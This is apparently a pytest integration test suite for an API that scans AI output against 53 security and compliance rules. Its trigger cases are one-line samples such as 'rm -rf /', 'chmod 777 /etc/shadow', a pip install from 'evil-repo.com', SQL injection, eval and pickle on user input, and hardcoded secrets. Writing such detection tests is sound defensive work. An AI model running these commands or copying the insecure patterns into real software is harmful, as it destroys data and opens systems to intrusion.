"""Integration tests: Output Rule Full Verification (O-01 ~ O-53).

All 53 rules are implemented — O-01~O-17 use Python checkers,
O-18~O-53 use JSON regex patterns.

Test data matches real-world AI output scenarios. Failing tests
indicate SDK pattern bugs, NOT bad test data.
"""
from __future__ import annotations

import pytest
from fastapi.testclient import TestClient


OUTPUT_TRIGGER_CASES = [
    # ── O-01 ~ O-17: Python checkers ──
    ("O-01", "To process user input, you can use eval(request.body)"),
    ("O-02", "Clean up by running: rm -rf /"),
    ("O-03", "subprocess.call(cmd, shell=True)"),
    ("O-04", 'cursor.execute(f"SELECT * FROM users WHERE id = {uid}")'),
    ("O-05", 'db.users.findOne({ $where: "this.funds > " + input })'),
    ("O-06", "try:\n    do_something()\nexcept:\n    pass"),
    ("O-07", "import random\ndef gen_token(): return random.randint(100000, 999999)"),
    ("O-08", "DocumentBuilderFactory.newInstance()"),
    ("O-09", 'render_template_string(f"Hello {name}")'),
    ("O-10", 'search = "(uid=" + user_input + ")"'),
    ("O-11", "data = pickle.loads(user_data)"),
    ("O-12", "response = requests.get(user_url)"),
    ("O-13", "requests.get(url, verify=False)"),
    ("O-14", "_.merge(target, req.body)"),
    ("O-15", "open(dir + user_filename)"),
    ("O-16", "(a+)+b"),
    ("O-17", "element.innerHTML = userInput"),
    # ── Credential leak (O-18 ~ O-22) ──
    ("O-18", "Here is your new API key: sk-proj-abcdefghijklmnopqrstT3BlbkFJuvwxyz1234567890. Please store it securely."),
    ("O-19", "Here's your JWT config: SECRET_KEY = \"my-secret-key-for-jwt-12345\""),
    ("O-20", "For testing purposes, you can use password = \"password123\""),
    ("O-21", "This code is from the Linux kernel: Copyright (c) 2024 Linus Torvalds"),
    ("O-22", "Note: This is CONFIDENTIAL — FOR INTERNAL USE ONLY"),
    # ── Security config (O-23 ~ O-26) ──
    ("O-23", "For production deployment, set DEBUG = True to see error details"),
    ("O-24", 'Add logging to debug the issue: logger.info(f"User password: {password}")'),
    ("O-25", "Connect to the internal DB at 10.0.0.5:5432"),
    ("O-26", "To make it accessible, run: chmod 777 /etc/shadow"),
    # ── Security design (O-27 ~ O-32) ──
    ("O-27", "Check if file exists, then delete it:\nif os.path.exists(temp_file):\n    os.remove(temp_file)"),
    ("O-28", "To read user input, use: char buffer[64]; gets(buffer);"),
    ("O-29", "On error, return the exception: except Exception as e:\n    return str(e)"),
    ("O-30", "Download the file from ftp://files.example.com/release.tar.gz"),
    ("O-31", "eval(base64_decode('ZWNobyAiSGVsbG8i'))"),
    ("O-32", "sign the token: jwt.sign(payload, 'secret', {algorithm: 'none'})"),
    # ── Supply chain (O-33 ~ O-37) ──
    ("O-33", "pip install git+https://evil-repo.com/malicious-package"),
    ("O-34", "Use lodash version 4.17.20 which is compatible"),
    ("O-35", "Verify your account at http://suspicious-login-page.xyz/verify"),
    ("O-36", "Add flask>=2.0 to requirements.txt"),
    ("O-37", "Use pip install -i https://mirrors.aliyun.com/pypi/simple/ for faster downloads"),
    # ── Content safety (O-38 ~ O-42) ──
    ("O-38", "Here's how to synthesize a dangerous chemical: step 1, obtain the precursors..."),
    ("O-39", "This ransomware encrypts all files using AES-256 and demands payment in Bitcoin..."),
    ("O-40", "Permission is hereby granted, free of charge, to any person obtaining a copy of this software..."),
    ("O-41", "Customer details: email user@example.com, phone 13800138000"),
    ("O-42", "According to CVE-2025-12345, this vulnerability affects all versions..."),
    # ── Compliance & legal (O-43 ~ O-47) ──
    ("O-43", "Implement AES-256-GCM encryption for data at rest"),
    ("O-44", "Store user data in the us-east-1 region for lower latency"),
    ("O-45", "Accept user submissions: const content = req.body.content; save(content)"),
    ("O-46", "Users can request right to erasure of their personal data"),
    ("O-47", "Use MD5 to hash passwords: import hashlib; hashlib.md5(password).hexdigest()"),
    # ── i18n & engineering (O-48 ~ O-50) ──
    ("O-48", "<button onclick=\"submit()\"><img src=\"icon.png\"></button>"),
    ("O-49", "<h1>欢迎使用我们的应用</h1> 不应该硬编码，应该用 i18n"),
    ("O-50", "Set timezone: pytz.timezone('Asia/Shanghai')"),
    # ── Compliance (O-52 ~ O-53) ──
    ("O-52", "DELETE FROM transactions WHERE id = %s"),
    ("O-53", "DELETE FROM users WHERE id = %s"),
]

P0_BLOCK_OUTPUT = {"O-18", "O-38", "O-39"}


class TestOutputRuleDetection:
    """All 53 O-rules trigger correctly."""

    @pytest.mark.parametrize("rule_id,content", OUTPUT_TRIGGER_CASES)
    def test_o_rule_trigger(self, client: TestClient, auth_headers: dict, rule_id: str, content: str):
        resp = client.post(
            "/v1/scan/output",
            json={"content": content, "user_id": "int-o"},
            headers=auth_headers,
        )
        assert resp.status_code == 200, f"{rule_id}: expected 200, got {resp.status_code}"
        data = resp.json()
        triggered_ids = [r["rule_id"] for r in data["triggered_rules"]]
        assert rule_id in triggered_ids, f"{rule_id} should have triggered, got: {triggered_ids}"

    @pytest.mark.parametrize("rule_id,content", [
        (r, c) for r, c in OUTPUT_TRIGGER_CASES if r in P0_BLOCK_OUTPUT
    ])
    def test_o_rule_blocked_state(self, client: TestClient, auth_headers: dict, rule_id: str, content: str):
        resp = client.post(
            "/v1/scan/output",
            json={"content": content, "user_id": "int-o-block"},
            headers=auth_headers,
        )
        assert resp.status_code == 200
        data = resp.json()
        assert data["blocked"] is True, f"{rule_id} (P0+block) should set blocked=true"


# ===========================================================================
# Breadth-first: safe content, API boundaries, edge cases
# ===========================================================================

class TestOutputSafeContent:
    """Negative tests: safe content should NOT trigger output rules."""

    SAFE_OUTPUT_CONTENT = [
        ("O-01", "Use a safe parsing library for user input"),
        ("O-02", "Please clean up temporary files using rm with caution"),
        ("O-03", "Use subprocess.run with argument list, not shell=True"),
        ("O-04", "Use parameterized queries for SQL"),
        ("O-05", "Validate user input before database queries"),
        ("O-06", "try:\n    risky()\nexcept SpecificError:\n    handle()"),
        ("O-07", "Use secrets module for token generation"),
        ("O-08", "Disable external entities in XML parser"),
        ("O-09", "Use template engine with auto-escaping"),
        ("O-10", "Use parameterized LDAP queries"),
        ("O-11", "Use JSON serializer instead of pickle"),
        ("O-12", "Validate and restrict URLs the server can fetch"),
        ("O-13", "Use verify=True and proper certificate validation"),
        ("O-14", "Use Object.assign with a new empty object target"),
        ("O-15", "Use os.path.realpath to resolve symlinks before opening"),
        ("O-16", "Use simple regex patterns to avoid ReDoS"),
        ("O-17", "Use textContent instead of innerHTML"),
        ("O-18", "Store API keys in environment variables"),
        ("O-19", "Load encryption keys from a secure key management service"),
        ("O-20", "Use strong passwords with at least 12 characters"),
        ("O-21", "Here is a simple sorting algorithm implementation"),
        ("O-22", "This information is publicly available"),
        ("O-23", "Set DEBUG = False in production"),
        ("O-24", 'logger.info(f"User ID: {user_id}")'),
        ("O-25", "DB_HOST should be configured via environment variable"),
        ("O-26", "Use chmod 644 for configuration files"),
        ("O-27", "Use a context manager to safely handle files"),
        ("O-28", "Use fgets() instead of gets() for safe input"),
        ("O-29", "Return a generic error message to the client"),
        ("O-30", "Use TLS encryption for secure network connections"),
        ("O-31", "import base64"),
        ("O-32", "Use RS256 for JWT signing"),
        ("O-33", "pip install from PyPI"),
        ("O-34", "Use the latest lodash version"),
        ("O-35", "Visit our docs at https://docs.example.com"),
        ("O-36", "Pin flask to 2.3.0"),
        ("O-37", "Use pip install from PyPI"),
        ("O-38", "Here's how to set up a chemistry lab safely"),
        ("O-39", "Here's how encryption works"),
        ("O-40", "The MIT license allows free use of the software"),
        ("O-41", "Customer details are in the CRM system"),
        ("O-42", "This is a common security vulnerability"),
        ("O-43", "Use HTTPS for data in transit"),
        ("O-44", "Choose an AWS region that complies with local regulations"),
        ("O-45", "Validate and sanitize user input before saving"),
        ("O-46", "Follow GDPR guidelines for data handling"),
        ("O-47", "Use bcrypt or Argon2 for password hashing"),
        ("O-48", "Use semantic HTML elements with proper heading tags"),
        ("O-49", "Use translation files for user-facing strings"),
        ("O-50", "Use user locale setting for timezone"),
        ("O-52", "Don't forget to add audit logging for financial operations"),
        ("O-53", "Use ON DELETE CASCADE for related tables"),
    ]

    @pytest.mark.parametrize("rule_id,content", SAFE_OUTPUT_CONTENT)
    def test_o_rule_safe_content(
        self, client: TestClient, auth_headers: dict, rule_id: str, content: str
    ):
        resp = client.post(
            "/v1/scan/output",
            json={"content": content, "user_id": "int-o-safe"},
            headers=auth_headers,
        )
        assert resp.status_code == 200
        data = resp.json()
        triggered_ids = [r["rule_id"] for r in data["triggered_rules"]]
        assert rule_id not in triggered_ids, (
            f"{rule_id}: safe output should not trigger, got: {triggered_ids}"
        )


class TestOutputAPIBoundaries:
    """API error handling and edge cases for output scan."""

    def test_empty_content(self, client: TestClient, auth_headers: dict):
        resp = client.post("/v1/scan/output", json={"content": "", "user_id": "int-o"}, headers=auth_headers)
        assert resp.status_code in (200, 422)

    def test_missing_content(self, client: TestClient, auth_headers: dict):
        resp = client.post("/v1/scan/output", json={"user_id": "int-o"}, headers=auth_headers)
        assert resp.status_code == 422

    def test_auth_required(self, client: TestClient):
        resp = client.post("/v1/scan/output", json={"content": "test", "user_id": "int-o"})
        assert resp.status_code == 401

    def test_invalid_auth(self, client: TestClient):
        resp = client.post(
            "/v1/scan/output", json={"content": "test"}, headers={"X-API-Key": "wrong"}
        )
        assert resp.status_code == 401

    def test_oversized_body(self, client: TestClient, auth_headers: dict):
        resp = client.post(
            "/v1/scan/output",
            json={"content": "x" * (12 * 1024 * 1024)},
            headers=auth_headers,
        )
        assert resp.status_code == 413

    def test_response_format(self, client: TestClient, auth_headers: dict):
        """Output scan response has correct schema."""
        resp = client.post(
            "/v1/scan/output",
            json={"content": "eval(user_input) can be dangerous", "user_id": "int-o-format"},
            headers=auth_headers,
        )
        assert resp.status_code == 200
        data = resp.json()
        assert "blocked" in data
        assert "action" in data
        assert "severity" in data
        assert "triggered_rules" in data
        assert "execution_time_ms" in data
        assert isinstance(data["blocked"], bool)
        assert data["execution_time_ms"] >= 0


class TestOutputMultiRule:
    """Content triggering multiple output rules simultaneously."""

    def test_multiple_output_triggers(self, client: TestClient, auth_headers: dict):
        content = (
            "Use eval for dynamic code execution. Also, "
            "the password = \"password123\" is for testing."
        )
        resp = client.post(
            "/v1/scan/output",
            json={"content": content, "user_id": "int-o-multi"},
            headers=auth_headers,
        )
        assert resp.status_code == 200
        data = resp.json()
        triggered_ids = [r["rule_id"] for r in data["triggered_rules"]]
        assert len(triggered_ids) >= 2, f"Expected >=2 rules, got: {triggered_ids}"

    def test_safe_output_no_triggers(self, client: TestClient, auth_headers: dict):
        """Completely safe output should not trigger any rules."""
        content = (
            "To implement a binary search in Python, you can write a function "
            "that takes a sorted list and a target value, then repeatedly divides "
            "the search interval in half."
        )
        resp = client.post(
            "/v1/scan/output",
            json={"content": content, "user_id": "int-o-clean"},
            headers=auth_headers,
        )
        assert resp.status_code == 200
        data = resp.json()
        assert data["triggered_rules"] == [], f"Clean output triggered: {data['triggered_rules']}"
        assert data["blocked"] is False


class TestOutputEdgeCases:
    """Edge cases for output scanning."""

    def test_very_long_output(self, client: TestClient, auth_headers: dict):
        """Very long safe output should not be blocked."""
        content = "This is a safe output. " * 10000
        resp = client.post(
            "/v1/scan/output",
            json={"content": content, "user_id": "int-o-long"},
            headers=auth_headers,
        )
        assert resp.status_code == 200, f"Long output should not fail: {resp.status_code}"
        data = resp.json()
        assert data["blocked"] is False, "Long safe output should not be blocked"

    def test_unicode_output(self, client: TestClient, auth_headers: dict):
        """Unicode output should be processed correctly."""
        content = "🌐 国际化支持: こんにちは世界 Привет мир"
        resp = client.post(
            "/v1/scan/output",
            json={"content": content, "user_id": "int-o-unicode"},
            headers=auth_headers,
        )
        assert resp.status_code == 200
        data = resp.json()
        assert data["blocked"] is False

    def test_code_block_output(self, client: TestClient, auth_headers: dict):
        """Code blocks in output should be scanned correctly."""
        content = """Here is an example:

```python
def hello():
    print("Hello, World!")
```

This function prints hello."""
        resp = client.post(
            "/v1/scan/output",
            json={"content": content, "user_id": "int-o-codeblock"},
            headers=auth_headers,
        )
        assert resp.status_code == 200

    def test_html_in_output(self, client: TestClient, auth_headers: dict):
        """HTML content in output should be scanned."""
        content = '<div class="container"><p>Safe HTML output</p></div>'
        resp = client.post(
            "/v1/scan/output",
            json={"content": content, "user_id": "int-o-html"},
            headers=auth_headers,
        )
        assert resp.status_code == 200
